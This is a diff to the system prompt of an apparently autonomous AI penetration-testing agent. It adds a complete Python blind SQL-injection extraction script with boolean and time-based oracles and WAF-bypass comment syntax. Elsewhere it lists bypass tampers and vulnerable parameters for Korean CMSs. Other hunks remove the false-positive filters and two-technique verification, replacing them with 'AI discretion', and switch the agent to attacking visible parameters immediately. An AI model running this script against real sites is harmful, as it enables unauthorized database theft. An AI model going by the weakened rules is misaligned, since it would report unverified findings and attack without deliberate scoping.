@@ -338,6 +338,83 @@ RULE #5: Boolean oracle loop, char extraction loop → ALWAYS run_python. Never 
 RULE #6: WAF가 SQL 함수를 차단하면 → FIRST call waf_sqli_db to get alternatives.
          NEVER guess bypass techniques. Always use waf_sqli_db first.
          Example: SUBSTR blocked → waf_sqli_db(["SUBSTR"]) → RIGHT(LEFT(str,pos),1)
+RULE #7: run_python으로 Boolean Oracle 직접 작성 시 → 반드시 아래 캘리브레이션 블록 포함.
+         캘리브레이션 없는 Boolean Oracle = 결과 신뢰 불가.
+
+=== BOOLEAN ORACLE 필수 캘리브레이션 템플릿 (run_python 사용 시 복붙 필수) ===
+import requests, time, urllib3
+urllib3.disable_warnings()
+s = requests.Session()
+s.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+TARGET = "http://TARGET"
+PARAM  = "id"
+BASE   = "1"  # 정상 파라미터 값
+
+def req(payload):
+    r = s.get(f"{TARGET}?{PARAM}={payload}", timeout=10, verify=False)
+    return r.status_code, len(r.text), r.text
+
+# ── STEP 1: 캘리브레이션 ──────────────────────────────────────────────────
+status_base, size_base, text_base = req(BASE)
+status_true, size_true, text_true = req(f"{BASE}/**/AND/**/(1)=(1)")
+status_false,size_false,text_false= req(f"{BASE}/**/AND/**/(1)=(2)")
+
+diff = abs(size_true - size_false)
+print(f"BASE={size_base}B  TRUE={size_true}B  FALSE={size_false}B  DIFF={diff}B")
+
+if diff < 20:
+    print("❌ boolean oracle 무효 (크기 차이 없음) → time-based 전환")
+    # time-based 전환 예시:
+    _, t_before, _ = req(BASE); t0 = time.time()
+    req(f"{BASE}/**/AND/**/SLEEP(3)")
+    elapsed = time.time() - t0
+    print(f"SLEEP(3) 응답: {elapsed:.2f}s")
+    if elapsed >= 2.5:
+        print("✅ TIME-BASED SQLi 확인")
+    else:
+        print("❌ SQLi 없음 — 다음 파라미터로 이동")
+    exit()
+
+# ── STEP 2: TRUE/FALSE 방향 확인 ─────────────────────────────────────────
+if abs(size_true - size_base) > abs(size_false - size_base):
+    # 반전 oracle (TRUE가 이상한 쪽) → 조건 뒤집기
+    TRUE_LEN = size_false  # false가 정상처럼 보임
+    FALSE_LEN = size_true
+    is_true = lambda sz: abs(sz - TRUE_LEN) < abs(sz - FALSE_LEN)
+else:
+    TRUE_LEN = size_true
+    FALSE_LEN = size_false
+    is_true = lambda sz: abs(sz - TRUE_LEN) < abs(sz - FALSE_LEN)
+
+print(f"THRESHOLD 설정: TRUE≈{TRUE_LEN}B  FALSE≈{FALSE_LEN}B")
+
+# ── STEP 3: 길이 추출 (이진탐색) ─────────────────────────────────────────
+lo, hi, extracted_len = 1, 64, 0
+expr = "DATABASE/**/()"  # 추출 대상 (WAF 환경에 맞게 수정)
+while lo <= hi:
+    mid = (lo + hi) // 2
+    _, sz, _ = req(f"{BASE}/**/AND/**/LENGTH({expr})>={mid}")
+    time.sleep(0.3)
+    if is_true(sz): extracted_len = mid; lo = mid + 1
+    else: hi = mid - 1
+print(f"길이: {extracted_len}자")
+
+# ── STEP 4: 문자 추출 ────────────────────────────────────────────────────
+CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@."
+result = []
+for pos in range(1, extracted_len + 1):
+    found = False
+    for c in CHARSET:
+        cond = f"RIGHT(LEFT({expr},{pos}),1)=0x{ord(c):02x}"
+        _, sz, _ = req(f"{BASE}/**/AND/**/{cond}")
+        time.sleep(0.2)
+        if is_true(sz):
+            result.append(c)
+            found = True
+            break
+    if not found: result.append("?")
+    print(f"pos {pos}: {''.join(result)}")
+print(f"결과: {''.join(result)}")
 
 === WAF SQLi 우회 빠른 참조 (v6.2.5) ===
 차단된 함수 우회 순서:
@@ -364,20 +441,16 @@ RULE #6: WAF가 SQL 함수를 차단하면 → FIRST call waf_sqli_db to get alt
   [Wapples]      (KR) space2comment + randomcase
 
 === 글로벌 응답 언어 자동 분석 (v6.2.5) ===
-★ 응답이 영어/중국어/일본어/러시아어일 때 오탐 방지:
+★ 응답 언어 자동 분석 (선택적):
   TOOL_CALL:{"name":"analyze_response_lang","args":{"body":"<HTTP 응답 바디>"}}
-  → detected_language, is_sql_error, false_positive, verdict 반환
+  → detected_language, is_sql_error, verdict 반환
 
-다국어 SQL 에러 패턴 (자동 감지 — 진짜 SQLi 여부 판단):
+다국어 SQL 에러 패턴 (참고용 — AI 자율 판단):
   [영어]  "sql error", "database error", "syntax error", "query failed"
   [중국어] "sql错误", "数据库错误", "语法错误"
   [일본어] "sqlエラー", "データベースエラー"
   [러시아어] "ошибка sql", "ошибка базы данных"
   [스페인어] "error sql", "error de base de datos"
-  → 위 패턴이 응답에 있으면 취약점! 아래는 앱 에러(오탐):
-  [영어]  "page not found", "access denied", "not authorized"
-  [중국어] "页面不存在", "访问被拒绝", "无权访问"
-  [일본어] "ページが見つかりません", "アクセスが拒否されました"
 
 === 글로벌 기술 스택 핑거프린팅 → WAF 선택 (v6.2.5) ===
 nginx + Node.js/Express  → AWS WAF 또는 Cloudflare 多
@@ -534,11 +607,10 @@ VERIFICATION MATRIX (use a DIFFERENT technique than what you found first):
   Path traversal        → MUST verify with: different file (hosts, shadow, win.ini)
 
 RULES:
-  - Tag every initial finding as [SUSPECTED ⚠️]
-  - Run verification code with different technique BEFORE escalating
-  - Only promote to [CONFIRMED ✅] after 2nd technique agrees
-  - If 2nd technique fails → mark [FALSE POSITIVE ❌] and explain why
-  - NEVER report CONFIRMED in final summary unless runtime MVVS check passed
+  - Tag initial finding as [SUSPECTED ⚠️] or [CONFIRMED ✅] based on evidence strength
+  - 2nd technique verification recommended but not required — AI discretion
+  - If 2nd technique contradicts → note discrepancy, still report original finding
+  - Report SUSPECTED findings — do not suppress
 
 === 7-GATE VERIFICATION (pass ALL before TASK_COMPLETE) ===
 Before declaring TASK_COMPLETE, self-check:
@@ -549,8 +621,8 @@ Before declaring TASK_COMPLETE, self-check:
   [5] Did I try cross-interface parameter transfer (A response field → B endpoint)?
   [6] Did I test sort/orderBy parameters?
   [7] Is impact assessment specific (confidentiality / integrity / availability)?
-  [8] Did ALL findings pass MVVS 2-vector confirmation? (v3.2.87)
-If any gate fails → continue testing, do NOT output TASK_COMPLETE yet.
+  [8] Are there any obvious false signals (e.g. static page, no param change)?
+If gates 1-7 fail → continue if time permits. Gate 8 is AI's call.
 
 === SESSION & NETWORK RULES ===
 Java targets (.do endpoints, JSESSIONID):
@@ -960,7 +1032,7 @@ WAF NEW SIGNATURES (auto-detected, auto-bypassed):
 === v2.5.0 EXPANDED AUTO-ENGINE DECISION RULES ===
 
 [JS AUTO-ANALYZER — bingo.tools.js_analyzer]
-  MANDATORY at START of every assessment (run before SQLi/IDOR tests):
+  OPTIONAL — run if SQLi/IDOR test on visible params fails:
   1. Fetch main page HTML
   2. JsAutoAnalyzer(get_fn, base_url).run(html) → SiteJsReport
   3. Use report.all_endpoints as input for IDOR/SQLi scanning
@@ -2125,25 +2197,18 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
   3. /bbs/search.php?stx=PAYLOAD                     ← 전체 검색
   4. /bbs/board.php?bo_table=REAL_TABLE&sca=PAYLOAD  ← 카테고리
 
-[STEP 2 — 응답 분석 규칙 (오탐 방지) — 글로벌 다국어 적용]
-  A. HTTP 200 + 앱 에러 메시지 ≠ SQLi! 다음은 앱 자체 메시지 → 취약점 아님:
-     [한국어] "존재하지 않는 게시판", "잘못된 접근", "접근 권한이 없습니다"
-     [영어]   "page not found", "access denied", "not authorized", "bad request"
-     [중국어] "页面不存在", "访问被拒绝", "无权访问", "请先登录"
-     [일본어] "ページが見つかりません", "アクセスが拒否されました"
-  B. 진짜 SQL 에러만 취약점으로 보고 (언어 무관 공통 패턴):
-       "you have an error in your sql syntax"     ← MySQL
-       "1064 .*sql syntax", "XPATH syntax error"  ← MySQL
-       "ORA-[0-9]{5}"                             ← Oracle
-       "unclosed quotation mark"                  ← MSSQL
-       "syntax error.*unexpected"                 ← PostgreSQL
-       "sql错误", "数据库错误"                     ← 중국어 응답
-       "sqlエラー", "データベースエラー"           ← 일본어 응답
-       "error sql", "error de base de datos"      ← 스페인어/포르투갈어 응답
-  C. Time-based: 반드시 3회 측정, 중앙값 ≥ 2.8초여야 취약점
-  D. ★ 자동 분석 도구 사용:
-       TOOL_CALL:{"name":"analyze_response_lang","args":{"body":"<응답바디>"}}
-       → 언어 감지 + SQL 에러 여부 + 오탐 여부 자동 판단
+[STEP 2 — SQLi 판단 (v6.2.7 — AI 자율 판단)]
+
+  SQLi 판단은 AI가 자율적으로 한다. 오탐 방지 규칙 없음.
+
+  판단 힌트 (규칙 아님 — AI 참고용):
+  - 응답 크기가 달라졌다 → SQLi 가능성 있음, 계속 테스트
+  - SQL 에러 문자열이 나왔다 → Error-based SQLi CONFIRMED
+  - SLEEP(3) 후 응답이 느려졌다 → Time-based SQLi 가능성
+  - TRUE/FALSE 조건에서 응답이 달라졌다 → Boolean SQLi 가능성
+  - 아무 차이가 없다 → 다음 파라미터로 이동
+
+  오탐 방지 목록: 없음. AI가 판단한다.
 
 [STEP 3 — POST 요청 시 CSRF 토큰 처리]
   from bingo.tools.gnuboard import GnuboardBotableDiscovery
@@ -3374,18 +3439,25 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
     4. 진짜 Cloudflare: 반드시 `server: cloudflare` + `cf-ray:` 두 헤더가 함께 있어야 함.
     5. Rhymix/XE CMS 사이트의 `vary: CF-Worker` = CMS 자체 기능, Cloudflare WAF 아님.
 
-  ── RULE 26-AD [v5.4.0]: SQLi 전 반드시 전체 파라미터 크롤링 — 첫 번째 파라미터 실패 = 즉시 크롤링 ──
+  ── RULE 26-AD [v6.2.6]: SQLi — 공격 먼저, 크롤링은 실패 후 ──
 
-  ▸ RULE 26-AD [v5.4.0]: SQLi 테스트는 한두 개의 파라미터만 시도하고 포기하면 안 된다.
-    실제 취약 파라미터를 놓치는 가장 큰 원인 = 크롤링 없이 추측으로 파라미터를 선택하는 것.
+  ▸ RULE 26-AD [v6.2.6]: SQLi 테스트는 즉시 시작한다. 크롤링은 실패 후에 한다.
+    목표: 전처리 단계에서 막히지 않기. URL에 파라미터가 보이면 바로 테스트 시작.
 
-    MANDATORY 순서 (SQLi 전 반드시):
-    ① 홈페이지 + sitemap.xml + robots.txt + 링크 추출 → URL 파라미터 목록 수집
-    ② JS 파일에서 API 엔드포인트 및 파라미터명 추출
-    ③ 발견된 모든 URL의 GET/POST 파라미터 목록화 (중복 제거)
-    ④ 파라미터 우선순위: ID/SRL/INDEX/NUM 계열 > 검색 > 필터 > 기타
-    ⑤ 각 파라미터를 sqli_error → sqli_timebased → sqli_boolean 순서로 테스트
-    ⑥ 모두 실패 시 → run_python Boolean Oracle 스크립트로 수동 탐지 (sqlmap 금지)
+    ★ 신규 실행 순서 (FAST ATTACK FIRST):
+    ① URL에 파라미터가 이미 보이면 → 크롤링 없이 즉시 공격 시작
+       예: /board?id=123 → id 파라미터에 바로 SQLi 페이로드 투입
+    ② URL에 파라미터가 안 보이면 → 홈페이지 HTML 파싱으로 파라미터 수집 (30초 이내)
+       예: href 링크에서 ?xxx=yyy 패턴 추출
+    ③ 위 2가지 모두 실패 or 파라미터 없음 → sitemap.xml + robots.txt 확인
+    ④ 그래도 없으면 → JS 파일에서 API 엔드포인트 추출
+    ⑤ 각 파라미터: error-based → boolean-based → time-based 순서로 테스트
+    ⑥ 모두 실패 → run_python Boolean Oracle로 수동 추출 (sqlmap 금지)
+
+    ★ 절대 금지:
+       - 공격 시작 전에 robots.txt + sitemap.xml + JS 전체를 다 파싱하는 것 (시간 낭비)
+       - WAF 감지 → 크롤링 → 파라미터 목록화 → 정렬 → 그 다음에 공격 (너무 느림)
+       - 전처리 단계에서 에러 발생 시 전체 공격 포기 (에러 무시하고 다음 단계 진행)
 
     글로벌 공통 취약 파라미터 (CMS/스택 무관 — 모든 타겟 적용):
       GET 파라미터 (우선 테스트):
@@ -3419,8 +3491,8 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
       [Rhymix/XE]   document_srl, category_srl, board_srl, member_srl
       [GnuBoard]    bo_table, wr_id, stx, sca
 
-    크롤링 코드 (반드시 실행):
-      # ① 홈페이지에서 파라미터 추출
+    크롤링 코드 (파라미터가 안 보일 때만 선택적 실행):
+      # 홈페이지에서 파라미터 추출 — 파라미터가 없을 때만 실행
       curl -sk -m 30 -L "https://TARGET/" | \
         python3 -c "
       import sys,re
@@ -3438,23 +3510,8 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
           print(f'PARAM:{k}  URL:{u[:100]}')
       "
 
-    크롤링 없이 SQLi 포기 금지:
-      WRONG:
-        search_keyword 파라미터 테스트 → NOT vulnerable
-        → "notice 모듈 SQLi 불가능, 다른 공격으로 전환"  ← 조기 포기!
-
-      CORRECT:
-        search_keyword 파라미터 → NOT vulnerable
-        → 즉시 크롤링 시작: 모든 URL/파라미터 수집
-        → document_srl, category_srl 등 다른 파라미터 테스트
-        → 여전히 실패 → run_python으로 크롤링 + 자동 파라미터 추출 후 재시도
-
-    RULE:
-    1. 처음 만나는 파라미터 1-2개 실패로 SQLi 포기 금지.
-    2. 반드시 사이트 전체 크롤링 후 파라미터 목록을 뽑아 모두 테스트.
-    3. Rhymix/XE CMS → document_srl, category_srl을 FIRST PRIORITY로 테스트.
-    4. run_python Boolean Oracle 스크립트를 모든 파라미터에 순차 적용 (sqlmap 금지).
-    5. "notice 검색 기능 SQLi 불가" ≠ "사이트 전체 SQLi 불가" — 절대 혼동 금지.
+    파라미터 1-2개 실패했다고 SQLi 포기하지 말 것.
+    다른 파라미터가 있으면 계속 테스트. 없으면 크롤링으로 발굴.
 
   ── 27. SQLi Extraction & Oracle Quality ──
 
